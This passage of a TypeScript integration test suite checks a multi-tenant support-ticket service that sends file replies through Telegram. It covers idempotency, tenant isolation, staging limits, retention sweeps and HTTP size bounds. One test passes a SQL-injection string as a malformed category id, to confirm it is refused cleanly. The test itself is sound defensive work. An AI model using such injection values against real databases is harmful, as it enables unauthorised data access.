      idempotencyKey: 'file-unknown-01',
      text: 'پیوست دوم',
      attachment: fileOf('second.pdf', 'application/pdf', PDF),
    });
    await deliver();
    fileMode = 'OK';
    sent = [];
    await deliver();
    expect(uploads()).toHaveLength(0);
    const detail = await web.controller.detail(web.request, ticketId);
    expect(detail.messages.find((one) => one.id === unknown.message.id)).toMatchObject({
      body: 'پیوست دوم',
      delivery: 'DELIVERED',
      attachmentDelivery: 'UNCONFIRMED',
      attachment: { kind: 'DOCUMENT', fileName: 'second.pdf' },
    });
    // Support still has the file it sent, from staging.
    expect((await download(web, unknown.message.id)).body.equals(PDF)).toBe(true);
  });

  it('stages and sends one file per key, and refuses the key reused with another file', async () => {
    const ticketId = await openThroughBot('دوبار کلیک');
    const web = await webAs(owner);
    const request = {
      idempotencyKey: 'file-replay-001',
      text: 'یک پاسخ با یک فایل',
      attachment: fileOf('screen.png', 'image/png', PNG),
    };
    const first = await web.controller.reply(web.request, ticketId, request);
    const again = await web.controller.reply(web.request, ticketId, request);
    expect(again.message.id).toBe(first.message.id);
    expect(await count(sql`SELECT count(*)::int AS n FROM ticket_reply_files`)).toBe(1);
    expect(await laneOf(first.message.id)).toHaveLength(2);
    sent = [];
    await deliver();
    // Replayed after delivery, the reply answers with where the file actually got.
    const late = await web.controller.reply(web.request, ticketId, request);
    expect(late.message).toMatchObject({ id: first.message.id, attachmentDelivery: 'DELIVERED' });
    await deliver();
    expect(uploads()).toHaveLength(1);

    const reused = await refusalOf(
      web.controller.reply(web.request, ticketId, {
        ...request,
        attachment: fileOf('other.pdf', 'application/pdf', PDF),
      }),
    );
    expect(reused.code).toBe('platform.idempotency_payload_mismatch');
    // The same words with no file is a different command too.
    const withoutFile = await refusalOf(
      web.controller.reply(web.request, ticketId, {
        idempotencyKey: request.idempotencyKey,
        text: request.text,
      }),
    );
    expect(withoutFile.code).toBe('platform.idempotency_payload_mismatch');
    expect(await count(sql`SELECT count(*)::int AS n FROM ticket_reply_files`)).toBe(1);
  });

  it('keeps support’s files to their tenant, bounds each tenant’s staging, and clears what Telegram never took', async () => {
    const ticketId = await openThroughBot('فضای ذخیره');
    const web = await webAs(owner);
    const actorA = adminActorFor(owner);

    // A real reply whose file is never delivered, before the tenant's staging fills up.
    const waiting = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'staged-wait-01',
      text: 'این پیوست منتظر می‌ماند',
      attachment: fileOf('wait.pdf', 'application/pdf', PDF),
    });
    // Ten more replies, each holding a file at the PDF bound: the tenant's staging is full.
    for (let index = 0; index < 10; index += 1) {
      await ctx.container.tickets.reply(tenantA, actorA, {
        ticketId,
        text: `پاسخ ${String(index)}`,
        idempotencyKey: `staged-fill-${String(index)}`,
      });
    }
    await ctx.container.database.db.execute(sql`
      INSERT INTO ticket_reply_files
        (tenant_id, message_id, ticket_id, bot_instance_id, kind, mime_type, file_name,
         byte_length, sha256, content)
      SELECT m.tenant_id, m.id, m.ticket_id, ${BOT_A}, 'DOCUMENT', 'application/pdf', 'big.pdf',
             10485760, repeat('a', 64), convert_to(repeat('A', 10485760), 'UTF8')
        FROM ticket_messages m
       WHERE m.ticket_id = ${ticketId} AND m.sender_type = 'ADMIN' AND m.body LIKE 'پاسخ %'`);
    const full = await refusalOf(
      web.controller.reply(web.request, ticketId, {
        idempotencyKey: 'staged-full-01',
        text: 'یکی دیگر',
        attachment: fileOf('screen.png', 'image/png', PNG),
      }),
    );
    expect(full.code).toBe('ticket.attachment_storage_full');
    expect(
      await count(sql`SELECT count(*)::int AS n FROM ticket_messages WHERE body = 'یکی دیگر'`),
    ).toBe(0);

    // Another tenant: its own staging, and none of tenant A's files.
    const foreignOwner = await createAdmin(ctx.container, tenantB, {
      username: 'owner-b-files',
      roleKeys: ['owner'],
    });
    const actorB = adminActorFor(foreignOwner);
    const foreign = await resolve(FOREIGN_TG, 'بیگانه', true);
    const categoryB = await ctx.container.ticketCategories.create(tenantB, actorB, {
      idempotencyKey: 'category-b-files',
      title: 'دستهٔ ب',
      sortOrder: 1,
    });
    const openedB = await ctx.container.tickets.openByCustomer(tenantB, systemActor('b'), {
      customerId: foreign,
      botInstanceId: BOT_B,
      categoryId: categoryB.category.id,
      text: 'تیکت مستأجر ب',
      file: null,
      idempotencyKey: 'open-b-files',
    });
    const replyB = await ctx.container.tickets.reply(tenantB, actorB, {
      ticketId: openedB.ticket.id,
      text: 'پاسخ ب',
      attachment: fileOf('screen.png', 'image/png', PNG),
      idempotencyKey: 'reply-b-files',
    });
    const [rowB] = await rows<{ tenant_id: string; bot_instance_id: string }>(
      sql`SELECT tenant_id, bot_instance_id FROM ticket_reply_files
           WHERE message_id = ${replyB.message.id}`,
    );
    expect(rowB).toEqual({ tenant_id: tenantB.tenantId, bot_instance_id: BOT_B });
    // Tenant B can neither read tenant A's file nor post one into tenant A's ticket.
    expect(
      (await refusalOf(ctx.container.tickets.attachmentOf(tenantB, actorB, waiting.message.id)))
        .code,
    ).toBe('ticket.attachment_unavailable');
    expect(
      (
        await refusalOf(
          ctx.container.tickets.reply(tenantB, actorB, {
            ticketId,
            text: 'از بیرون',
            attachment: fileOf('x.png', 'image/png', PNG),
            idempotencyKey: 'foreign-file-01',
          }),
        )
      ).code,
    ).toBe('ticket.not_found');
    // ...and tenant A cannot read tenant B's.
    expect(
      (await refusalOf(ctx.container.tickets.attachmentOf(tenantA, actorA, replyB.message.id)))
        .code,
    ).toBe('ticket.attachment_unavailable');

    // A week on, the retention sweep clears what Telegram never took; the rows stay.
    await ctx.container.database.db.execute(
      sql`UPDATE ticket_reply_files SET created_at = now() - interval '8 days'
           WHERE tenant_id = ${tenantA.tenantId}`,
    );
    expect(await ctx.container.ticketReplyFileSweeper.sweep()).toBe(11);
    expect(
      await count(
        sql`SELECT count(*)::int AS n FROM ticket_reply_files
             WHERE content IS NULL AND purged_at IS NOT NULL AND tenant_id = ${tenantA.tenantId}`,
      ),
    ).toBe(11);
    // Tenant B's fresh file is not A's retention's business.
    expect(await fileRow(replyB.message.id)).toMatchObject({ staged: true });

    // The waiting file's delivery now finds nothing to send, and fails rather than guess.
    sent = [];
    await deliver();
    expect(uploads()).toHaveLength(0);
    expect((await laneOf(waiting.message.id)).map((one) => [one.kind, one.state])).toEqual([
      ['TICKET_REPLY', 'DELIVERED'],
      ['TICKET_REPLY_ATTACHMENT', 'FAILED'],
    ]);
    const detail = await web.controller.detail(web.request, ticketId);
    expect(detail.messages.find((one) => one.id === waiting.message.id)).toMatchObject({
      body: 'این پیوست منتظر می‌ماند',
      attachment: { kind: 'DOCUMENT', fileName: 'wait.pdf' },
      attachmentDelivery: 'FAILED',
    });
    // Staging has room again.
    const after = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'staged-after-01',
      text: 'اکنون جا هست',
      attachment: fileOf('screen.png', 'image/png', PNG),
    });
    expect(after.message.attachmentDelivery).toBe('PENDING');
  });

  it('stamps Telegram’s handle on a delivered file whose bytes the retention sweep cleared mid-send (Codex #108)', async () => {
    const ticketId = await openThroughBot('پاک‌سازی هم‌زمان');
    const web = await webAs(owner);
    const reply = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'race-purge-01',
      text: 'پیوست در راه است',
      attachment: fileOf('guide.pdf', 'application/pdf', PDF),
    });
    // The sweep lands after the dispatcher read the bytes and before Telegram answers.
    const service = ctx.container.tickets;
    const original = service.attachmentFacts.bind(service);
    const sweptAt = new Date('2026-09-01T00:00:00.000Z');
    service.attachmentFacts = async (scope, messageId) => {
      const facts = await original(scope, messageId);
      await ctx.container.database.db.execute(
        sql`UPDATE ticket_reply_files SET content = NULL, purged_at = ${sweptAt.toISOString()}::timestamptz
             WHERE message_id = ${messageId}`,
      );
      return facts;
    };
    try {
      sent = [];
      await deliver();
    } finally {
      service.attachmentFacts = original;
    }
    expect(uploads()).toHaveLength(1);
    const [row] = await rows<{
      staged: boolean;
      telegram_file_id: string | null;
      telegram_file_unique_id: string | null;
      purged_at: Date;
    }>(
      sql`SELECT content IS NOT NULL AS staged, telegram_file_id, telegram_file_unique_id, purged_at
            FROM ticket_reply_files WHERE message_id = ${reply.message.id}`,
    );
    // Stamped although the bytes were already gone; the sweep's time is kept.
    expect(row).toMatchObject({ staged: false, telegram_file_id: 'sent-file-1' });
    expect(row?.telegram_file_unique_id).toBe('u-sent-file-1');
    expect(new Date(row!.purged_at).toISOString()).toBe(sweptAt.toISOString());
    expect(
      (await web.controller.detail(web.request, ticketId)).messages.at(-1)?.attachmentDelivery,
    ).toBe('DELIVERED');
    // Support reads it back from Telegram, with the handle the delivery stamped.
    sent = [];
    const fetched = await download(web, reply.message.id);
    expect(String(fetched.body)).toBe('%PDF-1.4 ticket');
    expect(sent.find((one) => one.url.endsWith('/getFile'))?.body).toEqual({
      file_id: 'sent-file-1',
    });
    // A second stamp never overwrites the handle already there.
    expect(
      await ctx.container.uow.run(tenantA, async (tx) =>
        ctx.container.tickets.attachmentDelivered(
          tenantA,
          reply.message.id,
          { fileId: 'other', fileUniqueId: 'u-other' },
          new Date(),
          tx,
        ),
      ),
    ).toBe(false);
    expect((await fileRow(reply.message.id))?.telegram_file_id).toBe('sent-file-1');
  });

  it('hands the dispatcher a reply’s text before its file when both are due in one pass (Codex #108)', async () => {
    const ticketId = await openThroughBot('ترتیب ارسال');
    const web = await webAs(owner);
    const reply = await web.controller.reply(web.request, ticketId, {
      idempotencyKey: 'order-text-first-01',
      text: 'اول متن، بعد فایل',
      attachment: fileOf('screen.png', 'image/png', PNG),
    });
    const [text, file] = await rows<{ created_at: Date; id: string; kind: string }>(
      sql`SELECT created_at, id, kind FROM customer_notifications
           WHERE subject_id = ${reply.message.id} ORDER BY id`,
    );
    // Enqueued at one instant, the text with the earlier id.
    expect([text?.kind, file?.kind]).toEqual(['TICKET_REPLY', 'TICKET_REPLY_ATTACHMENT']);
    expect(new Date(text!.created_at).getTime()).toBe(new Date(file!.created_at).getTime());
    // Both due in the same pass. The claim hands them over oldest first, `created_at` then
    // `id`, and returns them in that order (`claimDue`), so the text leaves first.
    await ctx.container.database.db.execute(
      sql`UPDATE customer_notifications SET next_attempt_at = now() - interval '1 second'
           WHERE state = 'PENDING'`,
    );
    sent = [];
    await ctx.container.customerNotificationLoop.tick();
    const toCustomer = sent.filter((one) => one.raw.includes(Buffer.from(CUSTOMER_TG)));
    expect(toCustomer.map((one) => one.url.split('/').at(-1))).toEqual([
      'sendMessage',
      'sendPhoto',
    ]);
  });

  it('answers a malformed category id with not-found, never a database error', async () => {
    const web = await webAs(owner);
    for (const id of ['not-a-uuid', '1', "' OR 1=1 --"]) {
      // A uuid cast failure in PostgreSQL was a 500; the parsed id is the category's 404.
      const refused = await web.controller.updateCategory(web.request, id, { sortOrder: 3 }).then(
        () => null,
        (error: unknown) => error,
      );
      expect(isNexaError(refused)).toBe(true);
      expect(isNexaError(refused) && [refused.code, refused.httpStatus]).toEqual([
        'ticket.category_not_found',
        404,
      ]);
    }
  });
});

/**
 * HF-A7: support's file as the Web Admin sends it — base64 inside the reply's JSON, through
 * Fastify's own body reader. The adapter's default limit is one mebibyte, so without the
 * route's own ceiling every file above about 768 KiB would be refused with a 413 before the
 * schema or the service ever saw it.
 */
describe('HF-A7 — support’s file over HTTP', () => {
  const ORIGIN = 'https://admin.example.test';
  let api: ApiApp;
  let cookie: string;
  let ticketId: string;

  const inject = (options: Record<string, unknown>) =>
    api.app
      .getHttpAdapter()
      .getInstance()
      .inject(options as never);

  beforeAll(async () => {
    const config = testConfig({ WEB_ADMIN_ORIGINS: ORIGIN });
    await migrateOnce(config.DATABASE_URL);
    api = await createApiApp(config);
  }, 120_000);

  afterAll(async () => {
    await api?.close();
  });

  beforeEach(async () => {
    await resetDatabase(api.container.database.db);
    await seed(api.container.database.db, api.container.cipher);
    api.container.setInstallationTenant(tenantA.tenantId);
    const owner = await createAdmin(api.container, tenantA, {
      username: 'owner-ticket-http',
      password: 'the-owners-real-password',
      roleKeys: ['owner'],
    });
    const login = await inject({
      method: 'POST',
      url: `${API_PREFIX}${AUTH_ROUTES.login}`,
      headers: { origin: ORIGIN },
      payload: { username: 'owner-ticket-http', password: 'the-owners-real-password' },
    });
    const match = new RegExp(`${SESSION_COOKIE_NAME}=([^;]+)`).exec(
      String(login.headers['set-cookie'] ?? ''),
    );
    if (match === null) throw new Error('No session cookie.');
    cookie = `${SESSION_COOKIE_NAME}=${match[1] as string}`;
    const resolved = await api.container.customers.resolveFromUpdate(tenantA, systemActor('h'), {
      idempotencyKey: 'resolve-ticket-http',
      telegramUserId: CUSTOMER_TG,
      from: { id: Number(CUSTOMER_TG), first_name: 'مریم' },
      botInstanceId: BOT_A,
    });
    const category = await api.container.ticketCategories.create(tenantA, adminActorFor(owner), {
      idempotencyKey: 'category-ticket-http',
      title: 'پیوست',
      sortOrder: 1,
    });
    const opened = await api.container.tickets.openByCustomer(tenantA, systemActor('h'), {
      customerId: resolved.customer.id,
      botInstanceId: BOT_A,
      categoryId: category.category.id,
      text: 'تیکت برای پیوست',
      file: null,
      idempotencyKey: 'open-ticket-http',
    });
    ticketId = opened.ticket.id;
  });

  const pdf = (size: number) => {
    const bytes = Buffer.alloc(size, 0x41);
    Buffer.from('%PDF-1.7\n').copy(bytes);
    return bytes;
  };
  const reply = (bytes: Buffer, idempotencyKey: string) =>
    inject({
      method: 'POST',
      url: `${API_PREFIX}${TICKET_ROUTES.reply(ticketId)}`,
      headers: { origin: ORIGIN, cookie },
      payload: {
        idempotencyKey,
        text: 'راهنمای کامل پیوست است.',
        attachment: {
          fileName: 'guide.pdf',
          mimeType: 'application/pdf',
          contentBase64: bytes.toString('base64'),
        },
      },
    });

  it('accepts a file at the largest type’s bound, and refuses one past it by the schema, never by the body reader', async () => {
    const atBound = await reply(pdf(10 * 1024 * 1024), 'http-file-at-bound');
    expect(atBound.statusCode, atBound.body.slice(0, 300)).toBe(201);
    expect(
      (atBound.json() as { message: { attachment: { fileSize: number } } }).message.attachment
        .fileSize,
    ).toBe(10 * 1024 * 1024);

    const past = await reply(pdf(10 * 1024 * 1024 + 1), 'http-file-past-bound');
    // 400 from the contract's own bound — a validation refusal, not the adapter's 413.
    expect(past.statusCode, past.body.slice(0, 300)).toBe(400);
    expect(past.body).toContain('"kind":"VALIDATION"');
  });
});
